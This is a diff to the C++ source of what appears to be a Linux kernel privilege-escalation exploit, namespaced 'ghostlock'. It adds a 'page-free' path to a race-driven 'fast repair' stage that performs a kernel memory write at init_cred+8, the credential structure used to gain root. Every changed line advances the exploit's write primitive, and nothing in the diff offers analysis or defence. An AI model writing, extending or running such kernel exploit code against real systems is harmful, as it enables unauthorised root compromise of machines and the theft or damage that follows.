@@ -215,6 +215,13 @@ namespace ghostlock::route {
      * do_kernel5_fake_lock_route() and shares only the pure payload encoding. */
     bool MulticastPolicy::w2_fast_repair_prebuild(
         session::ExploitSession &exploit_session) noexcept {
+        /* Page-free Stage 3: there is no page to prebuild. The repair derives
+         * its whole layout from the request (leaf write at init_cred+8), and
+         * activate() builds that context in place. */
+        if (support::page_free_run()) {
+            pr_info("W2 fast repair: page-free, no page to prebuild\n");
+            return true;
+        }
         const memory::WriteRequest repair_request = memory::WriteRequest::make(
             exploit_session.addresses.data_alias(
                 exploit_session.addresses.init_cred_image_addr()) + 8,
@@ -232,15 +239,25 @@ namespace ghostlock::route {
 
     bool MulticastPolicy::w2_fast_repair_activate(
         session::ExploitSession &exploit_session) noexcept {
-        if (!support::activate_prebuilt_page()) {
-            pr_warning("W2 fast repair activation failed\n");
-            return false;
-        }
         const memory::WriteRequest repair_request = memory::WriteRequest::make(
             exploit_session.addresses.data_alias(
                 exploit_session.addresses.init_cred_image_addr()) + 8,
             memory::WriteMode::Zero, 1);
-        pr_info("W2b: firing prebuilt init_cred+8 repair\n");
+        if (support::page_free_run()) {
+            /* Page-free Stage 3: no prebuilt page to swap in; the repair's
+             * layout is request-derived, so build it and fire the same way. */
+            if (!support::prepare_page_free_context(repair_request)) {
+                pr_warning("W2 fast repair: page-free context failed\n");
+                return false;
+            }
+            pr_info("W2b: firing init_cred+8 repair (page-free)\n");
+        } else {
+            if (!support::activate_prebuilt_page()) {
+                pr_warning("W2 fast repair activation failed\n");
+                return false;
+            }
+            pr_info("W2b: firing prebuilt init_cred+8 repair\n");
+        }
         exploit_session.race.fast_repair.store(1);
         const Status repaired = race::run_main_route_threads(repair_request);
         exploit_session.race.fast_repair.store(0);
